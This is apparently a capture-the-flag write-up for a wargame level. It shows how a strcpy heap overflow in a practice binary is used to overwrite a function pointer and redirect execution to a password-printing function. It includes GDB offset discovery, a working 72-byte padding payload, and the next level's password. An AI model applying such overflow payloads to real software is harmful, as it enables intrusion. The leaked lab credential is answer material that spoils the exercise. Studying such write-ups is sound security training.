# Level 6 - Function Pointer Overwrite

## Code Analysis

### Program Flow

The `main` function performs the following operations:

1. Allocates two buffers using `malloc`
2. Stores the address of function `m` in the second buffer
3. Uses `strcpy` to copy user input into the destination buffer
4. Calls the function pointer stored in the second buffer (defaults to `m`)

### Target Functions

**Function m:** Default function called by the program

**Function n:** Target function that directly outputs the password file

### Exploitation Goal

We need to overwrite the function pointer to redirect execution from function `m` to function `n`.

## Vulnerability: Strcpy Buffer Overflow

The `strcpy` function performs no bounds checking, allowing us to overflow the destination buffer and overwrite the function pointer stored in the second allocated buffer.

## Determining the Offset

### Using a Pattern Generator

We use a cyclic pattern to precisely identify the offset to the function pointer:

**[Pattern Generator Tool](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)** 

### Finding the Offset with GDB
```bash
gdb ./level6
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

**Output:**
```
Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
```
```gdb
(gdb) info registers eip
eip            0x41346341	0x41346341
```

Using the pattern generator to decode `0x41346341` reveals the offset is **72 bytes**.

## Finding the Target Address

**Address of function n:** `0x08048454`

**Little-endian representation:** `\x54\x84\x04\x08`

## Crafting the Exploit

### Initial Attempt
```bash
python -c 'print "B" * 72 + "\x54\x84\x04\x08"' > /tmp/exploit6
./level6 < /tmp/exploit6
```

**Issue:** The program segfaults immediately when no command-line arguments are provided, as it expects input via `argv` rather than stdin.

### Correct Execution Method

The payload must be passed as a command-line argument:
```bash
./level6 $(python -c 'print "B" * 72 + "\x54\x84\x04\x08"')
```

**Payload breakdown:**
- `"B" * 72`: Padding to reach the function pointer (72 bytes)
- `\x54\x84\x04\x08`: Address of function `n` in little-endian format

## Retrieving the Password

The password is displayed automatically upon successful exploitation.

## Credentials

**Username:** level7  
**Password:** `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`

## Summary

This level demonstrates **function pointer overwrite exploitation** through buffer overflow.

**Key concepts:**
- Understanding heap-allocated buffers and function pointers
- Exploiting `strcpy` for buffer overflow attacks
- Using cyclic patterns for precise offset calculation
- Redirecting execution by overwriting function pointers
- Distinguishing between stdin input and command-line arguments
- Converting pattern addresses to calculate offsets

**Important distinction:** Unlike previous levels where we overwrote return addresses or GOT entries, here we directly overwrite a function pointer stored in heap memory, demonstrating another common exploitation vector in vulnerable C programs.